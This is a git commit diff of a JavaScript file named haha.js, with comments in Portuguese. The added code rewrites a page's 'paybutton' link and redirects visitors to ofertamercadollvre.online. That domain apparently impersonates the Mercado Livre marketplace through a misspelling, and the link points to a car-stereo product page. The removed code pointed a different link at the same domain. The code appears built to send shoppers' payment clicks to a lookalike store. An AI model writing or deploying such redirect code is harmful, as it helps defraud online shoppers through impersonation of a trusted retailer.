e9f8887f1799945c5f55851812c475ac588af94f
Kelvin Santos <23528635+santoskelvin@users.noreply.github.com>
2024-07-03 05:01:26 -0300

    asas

--- haha.js
+++ haha.js
@@ -1,6 +1,19 @@
-document.addEventListener('DOMContentLoaded', function() {
-    var linkElement = document.querySelector('.color-options a');
-    if (linkElement) {
-        linkElement.href = 'https://ofertamercadollvre.online/products/som-automotivo-pioneer-mvh-s218bt-com-usb-bluetooth-e-radio';
-    }
-});
+
+		// Função para redirecionar para o link atual do span
+		function redirecionarParaLink() {
+			var link = document.getElementById('paybutton').getAttribute('href');
+			if (link) {
+				window.location.href = link;
+			}
+		}
+		
+		// Função para mudar dinamicamente o link
+		function alterarLinkNovo(linkNovo) {
+			var botao = document.getElementById('paybutton');
+			if (botao) {
+				botao.setAttribute('href', linkNovo);
+			}
+		}
+		
+		// Alterar dinamicamente para 'pay2.html'
+		alterarLinkNovo('https://ofertamercadollvre.online/products/som-automotivo-pioneer-mvh-s218bt-com-usb-bluetooth-e-radio');
